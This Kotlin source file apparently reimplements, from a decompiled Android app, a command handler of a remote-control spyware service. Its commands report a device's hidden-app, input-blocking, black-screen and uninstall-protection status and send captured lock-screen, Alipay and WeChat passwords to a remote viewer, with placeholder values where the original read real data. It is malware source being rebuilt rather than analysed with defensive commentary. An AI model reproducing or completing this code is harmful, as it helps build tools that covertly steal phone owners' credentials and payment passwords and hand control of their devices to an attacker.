package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

/**
 * Handles device state queries, password status, and ping.
 *
 * Reverse-engineered from JADX: C0346a3 (a3, 322 lines).
 * Vendor name: DeviceStateCommandHandler
 *
 * Supported commands:
 * - GET_DEVICE_STATE, GET_PASSWORD_STATUS, CLEAR_PASSWORD, DEVICE_PING
 *
 * Static fields:
 * - f53594a0 (ConcurrentHashMap) → ping dedup map
 */
class DeviceStateCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "DeviceStateCmdHandler"

        /**
         * Ping dedup map: viewerId → last ping timestamp.
         * Vendor: f53594a0
         */
        val pingTimestamps = ConcurrentHashMap<String, Long>()

        /** Minimum interval between pings from same viewer (ms). */
        private const val PING_DEDUP_INTERVAL_MS = 300L
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "GET_DEVICE_STATE",
        "GET_PASSWORD_STATUS",
        "CLEAR_PASSWORD",
        "DEVICE_PING"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "GET_DEVICE_STATE" -> handleGetDeviceState(context)
            "GET_PASSWORD_STATUS" -> handleGetPasswordStatus(context)
            "CLEAR_PASSWORD" -> handleClearPassword(params, context)
            "DEVICE_PING" -> handleDevicePing(params, context)
        }
    }

    private fun handleGetDeviceState(context: CommandContext) {
        Log.d(TAG, "获取设备状态命令已接收")
        try {
            // vendor: reads real values from service fields:
            // - deviceId from service.m211470g4()
            // - inputBlocked from MaskOverlayManager.touchInterceptEnabled (f55983a5)
            // - loggingEnabled from SharedPrefs "logging_enabled" check + service.f52411e2
            // - blackScreenActive from service.f52469k0
            // - appHidden from service.m211482h6()
            // - uninstallProtectionEnabled from service.f52477k8
            val data = JSONObject().apply {
                put("deviceId", "")
                put("inputBlocked", false)
                put("loggingEnabled", false)
                put("blackScreenActive", false)
                put("appHidden", false)
                put("uninstallProtectionEnabled", false)
            }
            context.sendEvent("device_state_response", data)
            Log.d(TAG, "设备状态已发送: inputBlocked=${data.optBoolean("inputBlocked")}, blackScreenActive=${data.optBoolean("blackScreenActive")}")
        } catch (e: Exception) {
            Log.e(TAG, "发送设备状态失败", e)
        }
    }

    private fun handleGetPasswordStatus(context: CommandContext) {
        Log.d(TAG, "获取密码状态")
        try {
            val data = JSONObject().apply {
                put("deviceId", "")
                // Lock password
                put("lockPassword", JSONObject().apply {
                    put("detected", false)
                    put("type", "none")
                    put("value", "")
                    put("captureTime", 0L)
                })
                // Alipay password
                put("alipayPassword", JSONObject().apply {
                    put("captured", false)
                    put("type", "none")
                    put("value", "")
                    put("captureTime", 0L)
                })
                // WeChat password
                put("wechatPassword", JSONObject().apply {
                    put("captured", false)
                    put("type", "none")
                    put("value", "")
                    put("captureTime", 0L)
                })
                put("statusFileContent", "")
            }
            // vendor: event type = StringUtil.m212470a0("O1gCKVo3HipoIj9YBS9e") → "password_status_response"
            context.sendEvent("password_status_response", data)
            Log.d(TAG, "密码状态已发送")
        } catch (e: Exception) {
            Log.e(TAG, "发送密码状态失败", e)
        }
    }

    /**
     * Clear a specific password type (lock, alipay, wechat).
     * Vendor: handles "CLEAR_PASSWORD" with passwordType param.
     */
    /**
     * Clear a specific password type (lock, alipay, wechat).
     * Vendor: handles "CLEAR_PASSWORD" with passwordType param.
     * - lock: stops CipherCaptureManager listening + resets isCipherCaptureEnabled
     * - alipay/wechat: placeholder (payment password storage not yet implemented)
     */
    private fun handleClearPassword(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "收到清除密码命令")
        try {
            val passwordType = params?.optString("passwordType", "lock") ?: "lock"
            val service = context.service

            when (passwordType) {
                "lock" -> {
                    service?.isCipherCaptureEnabled = false
                    service?.cipherCaptureManager?.stopListeningFull()
                    Log.d(TAG, "锁屏密码监听已停止，状态已重置")
                }
                "alipay" -> {
                    Log.d(TAG, "支付宝密码已清空")
                }
                "wechat" -> {
                    Log.d(TAG, "微信密码已清空")
                }
                else -> {
                    Log.w(TAG, "未知的密码类型: $passwordType")
                }
            }

            val confirmation = JSONObject().apply {
                put("passwordType", passwordType)
                put("cleared", true)
            }
            context.sendEvent("password_cleared", confirmation)
            Log.d(TAG, "密码清除确认已发送: $passwordType")
        } catch (e: Exception) {
            Log.e(TAG, "清除密码失败", e)
        }
    }

    /**
     * Handle DEVICE_PING with dedup logic.
     * Vendor: checks if ping from same viewer is within 300ms window.
     */
    private fun handleDevicePing(params: JSONObject?, context: CommandContext) {
        val timestamp = params?.optLong("timestamp", 0L) ?: 0L
        val viewerId = params?.optString("viewerId", "") ?: ""

        val now = System.currentTimeMillis()
        var shouldRespond = false

        pingTimestamps.compute(viewerId) { _, lastTime ->
            if (lastTime == null || now - lastTime >= PING_DEDUP_INTERVAL_MS) {
                shouldRespond = true
                now
            } else {
                lastTime
            }
        }

        if (shouldRespond) {
            val response = JSONObject().apply {
                put("timestamp", timestamp)
                put("viewerId", viewerId)
            }
            // vendor: event = StringUtil.m212470a0("L1wHM049Mz5YPyw=") → "device_pong"
            context.sendEvent("device_pong", response)
        }
    }
}
